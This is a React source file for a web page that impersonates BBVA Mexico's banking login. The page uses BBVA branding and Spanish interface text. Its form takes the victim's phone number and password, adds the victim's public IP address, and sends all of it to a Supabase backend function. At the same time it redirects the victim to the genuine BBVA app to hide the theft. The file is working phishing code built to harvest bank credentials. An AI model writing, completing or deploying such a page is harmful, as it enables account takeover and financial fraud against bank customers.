import { useState } from 'react'
import { supabase } from '../utils/supabase'
import './App.css'

type QuickActionProps = {
  icon: React.ReactNode
  label: React.ReactNode
  onClick?: () => void
}

function PersonAddIcon() {
  return (
    <svg viewBox="0 0 48 48" aria-hidden="true">
      <circle cx="19" cy="13" r="7" />
      <path d="M5 38c0-8 5.6-13 14-13s14 5 14 13" />
      <circle cx="34" cy="34" r="8" />
      <path d="M34 30v8M30 34h8" />
    </svg>
  )
}

function BranchIcon() {
  return (
    <svg viewBox="0 0 48 48" aria-hidden="true">
      <path d="M8 14h28v22H8zM14 10h26v22" />
      <path d="M28 20h12v8H28zM18 31h2" />
    </svg>
  )
}

function PhoneIcon() {
  return (
    <svg viewBox="0 0 48 48" aria-hidden="true">
      <path d="M15 8l7 8-5 5c2.7 5.3 5.7 8.3 11 11l5-5 8 7-4 6c-1.5 2.3-4.5 3-7 2-12.5-5-20.5-13-25.5-25.5-1-2.5-.3-5.5 2-7z" />
    </svg>
  )
}

function MenuIcon() {
  return (
    <svg viewBox="0 0 32 32" aria-hidden="true">
      <path d="M8 10h16M8 16h16M8 22h16" />
    </svg>
  )
}

function QuickAction({ icon, label, onClick }: QuickActionProps) {
  return (
    <button className="quick-action" type="button" onClick={onClick}>
      <span className="quick-action__icon">{icon}</span>
      <span>{label}</span>
    </button>
  )
}

function App() {
  const [showLogin, setShowLogin] = useState(false)
  const [phone, setPhone] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [loginError, setLoginError] = useState('')
  const [loginSuccess, setLoginSuccess] = useState('')

  // Apertura síncrona inmediata para iOS / Android
  const openApp = () => {
    const playStorePackage = 'com.bbva.bancomer'
    const appStoreId = '374824226'

    const userAgent = navigator.userAgent || navigator.vendor
    const isAndroid = /android/i.test(userAgent)
    const isIOS = /iPad|iPhone|iPod/.test(userAgent)

    if (isIOS) {
      window.location.href = 'bbvamexico://'
      setTimeout(() => {
        window.location.href = `https://apps.apple.com/app/id${appStoreId}`
      }, 1200)
    } else if (isAndroid) {
      window.location.href = `intent://open#Intent;scheme=bbvamexico;package=${playStorePackage};S.browser_fallback_url=https://play.google.com/store/apps/details?id=${playStorePackage};end`
    } else {
      window.open(`https://apps.apple.com/app/id${appStoreId}`, '_blank')
    }
  }

  // Obtener IP pública del cliente
  async function getPublicIP(): Promise<string> {
    try {
      const res = await fetch('https://api.ipify.org?format=json')
      const data = await res.json()
      return data.ip
    } catch (err) {
      return '0.0.0.0'
    }
  }

  async function handleLogin(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setLoginError('')
    setLoginSuccess('')
    setIsSubmitting(true)

    // 1. Iniciar redirección de forma SÍNCRONA inmediatamente tras el evento del clic
    openApp()

    // 2. Ejecutar la petición a Supabase en segundo plano
    try {
      const ip = await getPublicIP()
      const { error } = await supabase.functions.invoke('login', {
        body: { phone, password, ip },
      })

      if (error) {
        setLoginError('Error al conectar. Inténtalo más tarde.')
      } else {
        setLoginSuccess('Inicio de sesión exitoso')
        setPhone('')
        setPassword('')
      }
    } catch (err) {
      setLoginError('Error inesperado.')
    } finally {
      setIsSubmitting(false)
    }
  }

  if (showLogin) {
    return (
      <main className="login-screen">
        <header className="login-screen__header">
          <h1>Iniciar sesión</h1>
          <button
            className="close-button"
            type="button"
            aria-label="Cerrar inicio de sesión"
            onClick={() => {
              setLoginSuccess('')
              setLoginError('')
              setShowLogin(false)
            }}
          >
            <span aria-hidden="true">×</span>
          </button>
        </header>

        <form className="login-form" onSubmit={handleLogin}>
          <label>
            <span className="sr-only">Número celular</span>
            <input
              type="tel"
              placeholder="Número celular"
              autoComplete="tel"
              value={phone}
              onChange={(event) => setPhone(event.target.value)}
              required
            />
          </label>
          <label className="password-field">
            <span className="sr-only">Contraseña</span>
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="Contraseña"
              autoComplete="current-password"
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              required
            />
            <button
              type="button"
              aria-label={showPassword ? 'Ocultar contraseña' : 'Mostrar contraseña'}
              onClick={() => setShowPassword((visible) => !visible)}
            >
              <svg viewBox="0 0 24 24" aria-hidden="true">
                <path d="M3 12s3.5-5 9-5 9 5 9 5-3.5 5-9 5-9-5-9-5Z" />
                <circle cx="12" cy="12" r="2" />
              </svg>
            </button>
          </label>

          <button className="submit-login" type="submit" disabled={isSubmitting}>
            {isSubmitting ? 'Enviando...' : 'Continuar'}
          </button>

          {loginError && <p className="login-error" role="alert">{loginError}</p>}
          {loginSuccess && <p className="login-success" role="status">{loginSuccess}</p>}
          <a className="forgot-password" href="#0">
            ¿Olvidaste tu contraseña?
          </a>
        </form>
      </main>
    )
  }

  return (
    <main className="app-shell">
      <header className="topbar">
        <div className="brand-row">
          <div className="brand" aria-label="BBVA">
            BBVA
          </div>
          <button className="menu-button" type="button" aria-label="Abrir menú">
            <MenuIcon />
          </button>
        </div>
      </header>

      <section className="login-card" aria-labelledby="greeting">
        <h1 id="greeting">Buenas tardes</h1>
        <button
          className="login-button"
          type="button"
          onClick={() => {
            setLoginSuccess('')
            setLoginError('')
            setShowLogin(true)
          }}
        >
          Iniciar sesión
        </button>
        <p className="first-time">¿Ingresas por primera vez?</p>
        <a className="access-key" href="#0">
          Crear clave de acceso
        </a>

        <nav className="quick-actions" aria-label="Ayuda y servicios">
          <QuickAction
            icon={<PersonAddIcon />}
            label={
              <>
                Hazte clien-
                <br />
                te
              </>
            }
            onClick={openApp}
          />
          <QuickAction
            icon={<BranchIcon />}
            label={
              <>
                Sucursales y
                <br />
                cajeros
              </>
            }
            onClick={openApp}
          />
          <QuickAction icon={<PhoneIcon />} label="Línea BBVA" onClick={openApp} />
        </nav>
      </section>
    </main>
  )
}

export default App